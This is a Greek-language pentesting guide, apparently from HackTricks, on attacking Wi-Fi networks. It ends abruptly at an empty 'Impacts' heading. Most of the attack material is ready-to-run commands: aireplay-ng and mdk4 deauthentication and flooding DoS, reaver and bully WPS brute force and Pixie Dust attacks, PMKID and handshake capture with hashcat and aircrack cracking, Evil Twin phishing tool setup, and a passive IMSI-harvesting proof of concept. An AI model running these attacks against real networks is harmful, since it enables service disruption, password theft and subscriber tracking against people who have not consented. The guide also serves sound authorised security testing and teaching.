# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi βασικές εντολές
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Εργαλεία

### Hijacker & NexMon (Android εσωτερικό Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Τρέξτε το airgeddon με docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Μπορεί να πραγματοποιήσει επιθέσεις Evil Twin, KARMA και Known Beacons και στη συνέχεια να χρησιμοποιήσει ένα πρότυπο phishing για να καταφέρει να αποκτήσει τον πραγματικό κωδικό πρόσβασης του δικτύου ή να υποκλέψει διαπιστευτήρια κοινωνικών δικτύων.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Αυτό το εργαλείο αυτοματοποιεί **WPS/WEP/WPA-PSK** attacks. Θα κάνει αυτόματα:

- Θέτει τη διεπαφή σε monitor mode
- Σκανάρει για πιθανά networks - και σας επιτρέπει να επιλέξετε το/τα victim(s)
- Αν WEP - Εκκινεί WEP attacks
- If WPA-PSK
- Αν WPS: Pixie dust attack και το bruteforce attack (προσοχή, το brute-force attack μπορεί να πάρει πολύ χρόνο). Σημειώστε ότι δεν δοκιμάζει null PIN ή database/generated PINs.
- Προσπαθεί να συλλάβει το PMKID από το AP για να το crackάρει
- Προσπαθεί να deauthenticate clients του AP για να συλλάβει ένα handshake
- Αν PMKID ή Handshake, προσπαθεί να κάνει bruteforce χρησιμοποιώντας top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Αποσυνδέει όλους (ή ένα συγκεκριμένο ESSID/Client)
- Random fake APs -- Κρύβει nets, πιθανώς crash scanners
- Overload AP -- Προσπαθεί να kill το AP (συνήθως όχι πολύ χρήσιμο)
- WIDS -- Παίζει με το IDS
- TKIP, EAPOL -- Ορισμένες συγκεκριμένες επιθέσεις για DoS κάποιων APs
- **Cracking**
- Crack **WEP** (διάφορα εργαλεία και μέθοδοι)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Χρήσιμο για να capture captive portal creds και/ή να πραγματοποιήσει LAN attacks
- **WPA-PSK** Evil Twin -- Χρήσιμο για network attacks αν ξέρετε το password
- **WPA-MGT** -- Χρήσιμο για να capture company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Χρήσιμο για να capture captive portal creds και/ή να πραγματοποιήσει LAN attacks
- **+ WPA** -- Χρήσιμο για να capture WPA handshakes

## DOS

### Deauthentication Packets

**Περιγραφή από** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Οι Deauthentication attacks, μια διαδεδομένη μέθοδος στο Wi‑Fi hacking, περιλαμβάνουν την πλαστογράφηση πλαίσιων "management" ώστε να αποσυνδέονται βιαίως συσκευές από ένα δίκτυο. Αυτά τα μη κρυπτογραφημένα πακέτα εξαπατούν τους clients κάνοντάς τους να πιστέψουν ότι προέρχονται από το νόμιμο δίκτυο, επιτρέποντας στους επιτιθέμενους να συλλέξουν WPA handshakes για σκοπούς cracking ή να διαταράξουν επίμονα τις συνδέσεις δικτύου. Αυτή η τακτική, ανησυχητική στην απλότητά της, χρησιμοποιείται ευρέως και έχει σημαντικές επιπτώσεις για την ασφάλεια των δικτύων.**

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 σημαίνει deauthentication
- 1 είναι ο αριθμός των deauths που θα σταλούν (μπορείτε να στείλετε πολλαπλά αν θέλετε); 0 σημαίνει να σταλούνται συνεχώς
- -a 00:14:6C:7E:40:80 είναι η MAC address του access point
- -c 00:0F:B5:34:30:30 είναι η MAC address του client προς deauthenticate; αν παραληφθεί τότε στέλνεται broadcast deauthentication (δεν δουλεύει πάντα)
- ath0 είναι το όνομα της διεπαφής

### Disassociation Packets

**Disassociation packets**, παρόμοια με τα deauthentication packets, είναι ένας τύπος πλαισίου διαχείρισης που χρησιμοποιείται σε Wi‑Fi δίκτυα. Αυτά τα πακέτα χρησιμεύουν για να διακόψουν τη σύνδεση μεταξύ μιας συσκευής (όπως laptop ή smartphone) και ενός access point (AP). Η βασική διάκριση μεταξύ disassociation και deauthentication έγκειται στα σενάρια χρήσης τους. 

Ενώ ένα AP εκπέμπει **deauthentication packets για να αφαιρέσει ρητά rogue devices από το δίκτυο, disassociation packets συνήθως αποστέλλονται όταν το AP πρόκειται να τερματιστεί**, να επανεκκινήσει ή να μετακινηθεί, απαιτώντας έτσι την αποσύνδεση όλων των συνδεδεμένων κόμβων.

**Αυτή η επίθεση μπορεί να πραγματοποιηθεί με mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Περισσότερες DOS επιθέσεις από mdk4**

**Δες** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Στέλνει beacon frames για να εμφανίσει fake APs στους clients. Αυτό μερικές φορές μπορεί να προκαλέσει την κατάρρευση network scanners και ακόμη και drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Η αποστολή authentication frames σε όλα τα προσβάσιμα Access Points (APs) εντός εμβέλειας μπορεί να υπερφορτώσει αυτά τα APs, ειδικά όταν εμπλέκονται πολλαπλοί clients. Αυτή η έντονη κυκλοφορία μπορεί να προκαλέσει αστάθεια στο σύστημα, με αποτέλεσμα κάποια APs να παγώσουν ή ακόμα και να επανεκκινηθούν.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Το Probing Access Points (APs) ελέγχει αν ένα SSID εμφανίζεται σωστά και επιβεβαιώνει την εμβέλεια του AP. Αυτή η τεχνική, σε συνδυασμό με το **bruteforcing hidden SSIDs** με ή χωρίς wordlist, βοηθά στον εντοπισμό και στην πρόσβαση σε κρυφά δίκτυα.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Η αποστολή τυχαίων ή διπλών πακέτων σε διαφορετικές QoS ουρές μπορεί να ενεργοποιήσει τις Michael Countermeasures σε TKIP APs, οδηγώντας σε διακοπή λειτουργίας του AP για ένα λεπτό. Αυτή η μέθοδος είναι μια αποτελεσματική τακτική επίθεσης DoS (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Κατακλύζοντας ένα AP με **EAPOL Start frames** δημιουργεί **fake sessions**, υπερφορτώνοντας το AP και εμποδίζοντας νόμιμους clients. Εναλλακτικά, η έγχυση **fake EAPOL Logoff messages** αποσυνδέει εξαναγκαστικά τους clients· και οι δύο μέθοδοι διακόπτουν αποτελεσματικά την υπηρεσία δικτύου.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Επιθέσεις για IEEE 802.11s mesh networks**

Various attacks on link management and routing in mesh networks.

**ATTACK MODE w: WIDS Confusion**

Η διασύνδεση clients σε πολλαπλούς κόμβους WDS ή σε ψεύτικα rogue APs μπορεί να χειραγωγήσει τα Intrusion Detection and Prevention Systems, δημιουργώντας σύγχυση και πιθανή κατάχρηση του συστήματος.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Ένας packet fuzzer με διάφορες πηγές πακέτων και ένα ολοκληρωμένο σύνολο τροποποιητών για την επεξεργασία πακέτων.

### **Airggedon**

_**Airgeddon**_ προσφέρει τις περισσότερες από τις επιθέσεις που προτάθηκαν στα προηγούμενα σχόλια:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) απλοποιεί τη διαδικασία σύνδεσης συσκευών σε έναν router, επιταχύνοντας και διευκολύνοντας τη ρύθμιση για δίκτυα κρυπτογραφημένα με **WPA** ή **WPA2** Personal. Δεν είναι αποτελεσματικό απέναντι στην εύκολα παραβιαζόμενη ασφάλεια **WEP**. Το WPS χρησιμοποιεί έναν 8-ψήφιο PIN, που επαληθεύεται σε δύο μέρη, καθιστώντας το ευάλωτο σε brute-force επιθέσεις λόγω του περιορισμένου αριθμού συνδυασμών (11.000 πιθανότητες).

### WPS Bruteforce

Υπάρχουν 2 βασικά εργαλεία για την εκτέλεση αυτής της ενέργειας: Reaver και Bully.

- **Reaver** έχει σχεδιαστεί ως μια ανθεκτική και πρακτική επίθεση κατά του WPS, και έχει δοκιμαστεί ενάντια σε μεγάλη ποικιλία access points και υλοποιήσεων του WPS.
- **Bully** είναι μια **νέα υλοποίηση** της WPS brute force επίθεσης, γραμμένη σε C. Έχει αρκετά πλεονεκτήματα σε σχέση με τον αρχικό reaver κώδικα: λιγότερες εξαρτήσεις, βελτιωμένη απόδοση μνήμης και CPU, σωστή διαχείριση του endianness, και ένα πιο στιβαρό σύνολο επιλογών.

Η επίθεση εκμεταλλεύεται την **ευπάθεια του WPS PIN**, ιδιαίτερα το γεγονός ότι αποκαλύπτονται τα πρώτα τέσσερα ψηφία και ο ρόλος του τελευταίου ψηφίου ως checksum, καθιστώντας ευκολότερη την brute-force επίθεση. Ωστόσο, οι άμυνες ενάντια στις brute-force επιθέσεις — όπως το **blocking MAC addresses** επιθετικών επιτιθέμενων — απαιτούν **MAC address rotation** για να συνεχιστεί η επίθεση.

Αφού αποκτήσει το WPS PIN με εργαλεία όπως Bully ή Reaver, ο επιτιθέμενος μπορεί να αποκτήσει το WPA/WPA2 PSK, εξασφαλίζοντας **διαρκή πρόσβαση στο δίκτυο**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Αυτή η βελτιωμένη προσέγγιση στοχεύει τα WPS PINs χρησιμοποιώντας γνωστές ευπάθειες:

1. **Pre-discovered PINs**: Χρησιμοποιεί μια βάση δεδομένων με γνωστά PINs συνδεδεμένα με συγκεκριμένους κατασκευαστές που είναι γνωστό ότι χρησιμοποιούν ομοιόμορφα WPS PINs. Αυτή η βάση δεδομένων συσχετίζει τα πρώτα τρία οκτέτ των MAC-addresses με πιθανά PINs για αυτούς τους κατασκευαστές.
2. **PIN Generation Algorithms**: Χρησιμοποιήστε αλγορίθμους όπως ComputePIN και EasyBox, που υπολογίζουν WPS PINs βάσει του MAC-address του AP. Ο αλγόριθμος Arcadyan απαιτεί επιπλέον ένα device ID, προσθέτοντας ένα επίπεδο στη διαδικασία δημιουργίας PIN.

### WPS Pixie Dust attack

**Dominique Bongard** ανακάλυψε μια ευπάθεια σε μερικά Access Points (APs) σχετικά με τη δημιουργία μυστικών κωδικών, γνωστών ως **nonces** (**E-S1** και **E-S2**). Αν αυτοί οι nonces μπορούν να εξαχθούν, το σπάσιμο του WPS PIN του AP γίνεται εύκολο. Το AP αποκαλύπτει το PIN μέσα σε έναν ειδικό κωδικό (hash) για να αποδείξει ότι είναι νόμιμο και όχι ένα fake (rogue) AP. Αυτοί οι nonces είναι ουσιαστικά τα "κλειδιά" για να ξεκλειδωθεί το "κουτί" που κρατάει το WPS PIN. Περισσότερα μπορείτε να βρείτε [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Με απλά λόγια, το πρόβλημα είναι ότι ορισμένα APs δεν χρησιμοποιούσαν αρκετά τυχαία κλειδιά για την κρυπτογράφηση του PIN κατά τη διαδικασία σύνδεσης. Αυτό καθιστά το PIN ευάλωτο στο να μαντευτεί από έξω από το δίκτυο (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Αν δεν θέλετε να θέσετε τη συσκευή σε monitor mode, ή αν το `reaver` και το `bully` έχουν κάποιο πρόβλημα, μπορείτε να δοκιμάσετε [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Αυτό το εργαλείο μπορεί να εκτελέσει Pixie Dust attack χωρίς να χρειάζεται να θέσετε τη συσκευή σε monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Κάποια κακοσχεδιασμένα συστήματα επιτρέπουν ακόμη και σε ένα **Null PIN** (ένα κενό ή ανύπαρκτο PIN) να παρέχει πρόσβαση, κάτι που είναι μάλλον ασυνήθιστο. Το εργαλείο **Reaver** μπορεί να ελέγξει για αυτήν την ευπάθεια, σε αντίθεση με το **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Όλες οι προτεινόμενες επιθέσεις WPS μπορούν να εκτελεστούν εύκολα χρησιμοποιώντας το _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 σου επιτρέπουν να δοκιμάσεις **your custom PIN** (αν έχεις)
- 7 and 8 εκτελούν την **Pixie Dust attack**
- 13 σου επιτρέπει να δοκιμάσεις το **NULL PIN**
- 11 and 12 θα **ανακτήσουν τα PINs που σχετίζονται με το επιλεγμένο AP από διαθέσιμες βάσεις δεδομένων** και θα **παράγουν** πιθανά **PINs** χρησιμοποιώντας: ComputePIN, EasyBox και προαιρετικά Arcadyan (συνιστάται, γιατί όχι?)
- 9 and 10 θα δοκιμάσουν **every possible PIN**

## **WEP**

Πολύ προβληματικό και σχεδόν εκτός χρήσης στις μέρες μας. Απλώς να ξέρεις ότι το _**airgeddon**_ έχει μια επιλογή WEP που ονομάζεται "All-in-One" για επίθεση σε αυτό το είδος προστασίας. Πολλά άλλα εργαλεία προσφέρουν παρόμοιες επιλογές.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

Το 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) μια νέα μέθοδο επίθεσης, μοναδική επειδή χρειάζεται μόνο **ένα μόνο πακέτο** και δεν απαιτεί να υπάρχουν πελάτες συνδεδεμένοι στο AP-στόχο — μόνο αλληλεπίδραση μεταξύ του επιτιθέμενου και του AP.

Πολλοί σύγχρονοι δρομολογητές προσθέτουν ένα **προαιρετικό πεδίο** στο **πρώτο πλαίσιο EAPOL** κατά τη διαδικασία association, γνωστό ως `Robust Security Network`. Αυτό περιλαμβάνει το `PMKID`.

Όπως εξηγεί η αρχική δημοσίευση, το **PMKID** δημιουργείται χρησιμοποιώντας γνωστά δεδομένα:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Δεδομένου ότι το "PMK Name" είναι σταθερό, γνωρίζουμε το BSSID του AP και της station, και το `PMK` είναι ταυτόσημο με αυτό από ένα πλήρες 4-way handshake, το **hashcat** μπορεί να χρησιμοποιήσει αυτές τις πληροφορίες για να crackάρει το PSK και να ανακτήσει το passphrase!

Για να **συλλέξετε** αυτές τις πληροφορίες και να **bruteforce** το password τοπικά μπορείτε να κάνετε:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Τα **PMKIDs που συλλέχθηκαν** θα εμφανιστούν στην **console** και επίσης θα **αποθηκευτούν** μέσα στο \_ **/tmp/attack.pcap**\_\

Τώρα, μετατρέψτε την καταγραφή σε μορφή **hashcat/john** και σπάστε την:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Σημειώστε ότι η μορφή ενός σωστού hash περιέχει **4 μέρη**, όπως: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Αν το δικό σας **περιέχει μόνο** **3 μέρη**, τότε είναι **άκυρο** (η PMKID capture δεν ήταν έγκυρη).

Σημειώστε ότι `hcxdumptool` **also capture handshakes** (κάτι σαν αυτό θα εμφανιστεί: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Μπορείτε να **μετατρέψετε** τα **handshakes** σε μορφή **hashcat**/**john** χρησιμοποιώντας `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Έχω παρατηρήσει ότι κάποια handshakes που καταγράφηκαν με αυτό το εργαλείο δεν μπόρεσαν να cracked ακόμα κι αν γνωρίζαμε το σωστό password. Συνιστώ να καταγράφετε handshakes και με τον παραδοσιακό τρόπο όταν είναι δυνατόν, ή να καταγράψετε αρκετά από αυτά χρησιμοποιώντας αυτό το εργαλείο._

### Handshake capture

Μία επίθεση σε **WPA/WPA2** δίκτυα μπορεί να πραγματοποιηθεί καταγράφοντας ένα **handshake** και προσπαθώντας να **crack** το **password** **offline**. Αυτή η διαδικασία περιλαμβάνει την παρακολούθηση της επικοινωνίας ενός συγκεκριμένου δικτύου και της **BSSID** σε έναν συγκεκριμένο **channel**. Ακολουθεί ένας συνοπτικός οδηγός:

1. Εντοπίστε την **BSSID**, τον **channel** και έναν **connected client** του στοχευόμενου δικτύου.
2. Χρησιμοποιήστε `airodump-ng` για να παρακολουθήσετε την κυκλοφορία του δικτύου στον καθορισμένο **channel** και **BSSID**, ελπίζοντας να καταγράψετε ένα **handshake**. Η εντολή θα μοιάζει με αυτή:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Για να αυξήσετε την πιθανότητα σύλληψης ενός handshake, αποσυνδέστε προσωρινά τον client από το δίκτυο για να τον αναγκάσετε να κάνει re-authentication. Αυτό μπορεί να γίνει χρησιμοποιώντας την εντολή `aireplay-ng`, η οποία στέλνει deauthentication packets στον client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Σημειώστε ότι, καθώς ο client ήταν deauthenticated, μπορεί να προσπαθήσει να συνδεθεί σε διαφορετικό AP ή, σε άλλες περιπτώσεις, σε διαφορετικό δίκτυο._

Μόλις στο `airodump-ng` εμφανιστούν πληροφορίες handshake, αυτό σημαίνει ότι το handshake καταγράφτηκε και μπορείτε να σταματήσετε να ακούτε:

![](<../../images/image (172) (1).png>)

Μόλις το handshake καταγραφεί, μπορείτε να το **crack** με `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Έλεγχος αν υπάρχει handshake στο αρχείο

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Εάν αυτό το εργαλείο εντοπίσει ένα μη ολοκληρωμένο handshake ενός ESSID πριν από το ολοκληρωμένο, δεν θα εντοπίσει το έγκυρο._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Σε **enterprise WiFi setups, θα συναντήσετε διάφορες μεθόδους πιστοποίησης**, η κάθε μία παρέχει διαφορετικά επίπεδα ασφάλειας και δυνατότητες διαχείρισης. Όταν χρησιμοποιείτε εργαλεία όπως το `airodump-ng` για να ελέγξετε την κυκλοφορία δικτύου, μπορεί να παρατηρήσετε αναγνωριστικά για αυτούς τους τύπους πιστοποίησης. Μερικές κοινές μέθοδοι περιλαμβάνουν:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Αυτή η μέθοδος υποστηρίζει hardware tokens και one-time passwords εντός του EAP-PEAP. Σε αντίθεση με το MSCHAPv2, δεν χρησιμοποιεί peer challenge και στέλνει τους κωδικούς σε απλό κείμενο στο access point, δημιουργώντας κίνδυνο για downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Αφορά την αποστολή του MD5 hash του κωδικού από τον client. Είναι **not recommended** λόγω ευπάθειας σε dictionary attacks, έλλειψης server authentication και ανικανότητας να παραχθούν session-specific WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Χρησιμοποιεί τόσο client-side όσο και server-side πιστοποιητικά για authentication και μπορεί να παράγει δυναμικά user-based και session-based WEP keys για την ασφάλεια της επικοινωνίας.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Παρέχει mutual authentication μέσω ενός encrypted tunnel, μαζί με μέθοδο για να προκύψουν δυναμικά, per-user, per-session WEP keys. Απαιτεί μόνο server-side certificates, ενώ οι clients χρησιμοποιούν credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Λειτουργεί παρόμοια με το EAP δημιουργώντας ένα TLS tunnel για προστατευμένη επικοινωνία. Επιτρέπει τη χρήση ασθενέστερων authentication protocols πάνω από το EAP χάρη στην προστασία που προσφέρει το tunnel.
- **PEAP-MSCHAPv2**: Συχνά αναφέρεται ως PEAP, συνδυάζει τον ευάλωτο MSCHAPv2 challenge/response μηχανισμό με ένα προστατευτικό TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Παρόμοιο με το EAP-TLS αλλά ξεκινά ένα TLS tunnel πριν την ανταλλαγή πιστοποιητικών, προσφέροντας ένα επιπλέον επίπεδο ασφάλειας.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- In this scenario, all users employ the pseudonymous "anonymous" as their user identifier. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- In this situation, users from different realms conceal their identities while indicating their respective realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Κάντε κλικ για να επεκτείνετε</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Σημειώσεις:
- Λειτουργεί πριν από οποιαδήποτε σήραγγα TLS αν η εγκατάσταση χρησιμοποιεί γυμνό EAP‑SIM/AKA χωρίς προστατευμένη ταυτότητα/ψευδώνυμα.
- Η εκτεθειμένη τιμή είναι ένας μόνιμος αναγνωριστής συνδεδεμένος με την SIM του συνδρομητή· η συλλογή του επιτρέπει μακροχρόνια παρακολούθηση και επακόλουθες καταχρήσεις στις τηλεπικοινωνίες.

Επιπτώσεις
